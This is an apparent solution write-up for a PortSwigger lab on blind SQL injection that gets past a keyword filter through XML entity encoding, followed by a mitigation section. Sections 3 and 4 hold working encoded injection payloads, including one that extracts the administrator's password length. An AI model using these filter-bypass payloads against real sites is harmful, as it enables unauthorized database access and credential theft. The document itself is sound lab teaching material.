# 🧪 Lab 18: SQL Injection with Filter Bypass via XML Encoding Solution

**PortSwigger Lab Link:** [https://portswigger.net/web-security/sql-injection/lab-sql-injection-with-filter-bypass-via-xml-encoding]

**Table of Contents:**
* 1. Lab Description & Goal
* 2. Vulnerability: WAF Bypass via XML Encoding
* 3. Exploitation Steps: Bypassing the Filter
* 4. Exploitation Steps: Dumping Data
* 5. Key Learnings/Concepts
* 6. Mitigation

---

## 1. Lab Description & Goal

This lab involves a **blind SQL Injection** vulnerability that is protected by an input filter, simulating a basic **Web Application Firewall (WAF)**. The filter is designed to block common SQL injection keywords like `SELECT`, `UNION`, and `OR`.

* **Goal:** Dump the administrator's password by finding a way to inject SQL queries *without* using blacklisted keywords, leveraging the application's **XML parsing** capabilities.
* **Vulnerability Location:** A data field that is processed as **XML** on the backend, typically used in search or product lookup functionality.
* **The Oracle:** The application's response (similar to previous labs, likely a Boolean or Error-based check).

---

## 2. Vulnerability: WAF Bypass via XML Encoding

The vulnerability is a standard SQL injection, but the novelty lies in the **bypass technique**:

* **The Filter:** The application or WAF checks incoming user input for blacklisted SQL keywords (e.g., `SELECT`, `OR`, `UNION`).
* **The Bypass:** The vulnerable parameter is parsed as XML on the server. We can **XML-encode** critical characters (like spaces and the single quote `'`) and **XML-entity encode** the blacklisted keywords.
    * **XML Encoding** means replacing a character with its entity reference (e.g., a space is often replaced with `&#x20;` or `&#32;`).
    * The server's XML parser will **decode the entity references** *before* the input is passed to the SQL engine. However, the WAF often checks the raw, incoming input *before* this XML decoding takes place, allowing the encoded payload to slip through the filter.

## 3. Exploitation Steps: Bypassing the Filter

To confirm the bypass, we must try to execute a simple, filtered SQL command using XML encoding.

### 🔹 Step 1: Identify the Filtered Keyword

1.  In Burp Repeater, test a simple payload that uses a common filtered keyword (e.g., `' OR 1=1--`).
2.  If the request is blocked or yields a "WAF detected" message, confirm the filter is active.

### 🔹 Step 2: Encode the Blacklisted Keyword (Example: `OR`)

We need to encode the `OR` keyword so the filter doesn't see it, but the database eventually executes it.

1.  Find the XML entity reference for each letter: `O` is `&#x4f;`, `R` is `&#x52;`.
2.  **Encoded Keyword (OR):** `&#x4f;&#x52;`
3.  **Encoded Space:** Spaces are also often filtered, so replace them with `&#x20;`.

### 🔹 Step 3: Inject the Encoded Payload

1.  Inject the following payload into the vulnerable XML field:
    ```sql
    '&#x20;&#x4f;&#x52;&#x20;1=1--
    ```
    * **Original:** `' OR 1=1--`
    * **WAF sees:** `'&#x20;&#x4f;&#x52;&#x20;1=1--` (Looks safe)
    * **SQL DB sees (after decoding):** `' OR 1=1--` (Executes successfully)

2.  If the injection succeeds (e.g., all products are returned), the XML encoding bypass is confirmed.

---

## 4. Exploitation Steps: Dumping Data

Once the bypass is confirmed, the standard blind SQL injection techniques (Boolean or Time-based) can be used, ensuring all keywords (`SELECT`, `AND`, `UNION`) are fully XML-encoded.

### A. Encode the Full Query

Every keyword used in the attack must be encoded.

| Keyword | Encoded Value (Partial) |
| :--- | :--- |
| `SELECT` | `&#x53;&#x45;&#x4C;&#x45;&#x43;&#x54;` |
| `AND` | `&#x41;&#x4E;&#x44;` |
| `FROM` | `&#x46;&#x52;&#x4F;&#x4D;` |
| `SUBSTRING` | `&#x53;&#x55;&#x42;&#x53;&#x54;&#x52;&#x49;&#x4E;&#x47;` |

### B. Final Blind Payload (Example: Length Check)

The final payload structure will look verbose but will be executed by the database.

* **Original Query (Length Check):**
    ```sql
    ' AND (SELECT LENGTH(password) FROM users WHERE username='administrator')=N--
    ```
* **Encoded Payload (Requires full character-by-character encoding):**
    ```sql
    '&#x20;&#x41;&#x4E;&#x44;&#x20;&#x28;&#x53;&#x45;&#x4C;&#x45;&#x43;&#x54;&#x20;&#x4C;&#x45;&#x4E;&#x47;&#x54;&#x48;&#x28;&#x70;&#x61;&#x73;&#x73;&#x77;&#x6F;&#x72;&#x64;&#x29;&#x20;&#x46;&#x52;&#x4F;&#x4D;&#x20;&#x75;&#x73;&#x65;&#x72;&#x73;&#x20;&#x57;&#x48;&#x45;&#x52;&#x45;&#x20;&#x75;&#x73;&#x65;&#x72;&#x6E;&#x61;&#x6D;&#x65;&#x3D;&#x27;&#x61;&#x64;&#x6D;&#x69;&#x6E;&#x69;&#x73;&#x74;&#x72;&#x61;&#x74;&#x6F;&#x72;&#x27;&#x29;&#x3D;N&#x2D;&#x2D;
    ```
    (Note: This full payload must then be brute-forced using Burp Intruder, substituting `N` for the number being checked).

### C. Solve

The full attack involves two rounds of brute-forcing using an encoded payload:
1.  Determine **length** (replacing `N` with numbers 1-30).
2.  Determine **characters** (using `SUBSTRING()` and replacing the position `I` and character `C` with numbers and characters, respectively).

---

## 5. Key Learnings/Concepts

* **WAF Bypass:** Understanding that WAFs operate at the network/application layer and check input syntax before any server-side processing (like XML parsing) occurs.
* **XML Entity Encoding:** The technique of replacing characters (especially those in keywords) with their entity references (e.g., `&#xNN;` or `&keyword;`).
* **Order of Operations:** The XML parser decodes the input *after* the WAF checks the raw string. This is the core bypass mechanism.
* **Payload Complexity:** Blind SQL injection payloads become extremely long and hard to read when fully encoded, making **automation (Burp Intruder)** and a reliable **encoding tool** mandatory.
* **Generalizing Bypasses:** The principle (encoding input to deceive a filter) applies to other contexts, such as URL encoding, HTML encoding, and Unicode encoding.

---

## 6. Mitigation

1.  **Stop Blacklisting:** Filters based on a blacklist of keywords (`SELECT`, `OR`, etc.) are notoriously easy to bypass. Use a **whitelist** approach for input validation instead (only allowing expected characters like alphanumeric and hyphens).
2.  **Input Standardization:** If using a WAF, ensure it processes the input in the **same format** as the final application. The WAF must be configured to decode XML entities *before* performing its signature matching.
3.  **Parameterized Queries (Prepared Statements):** The final, absolute defense. By separating code from data, the application never attempts to execute the decoded XML payload as an SQL command, regardless of the encoding used.
4.  **Use of XML Parser Configuration:** Configure the XML parser to disable DTD processing or external entity resolution if those features are not strictly required, which can block more complex XML-based attacks.
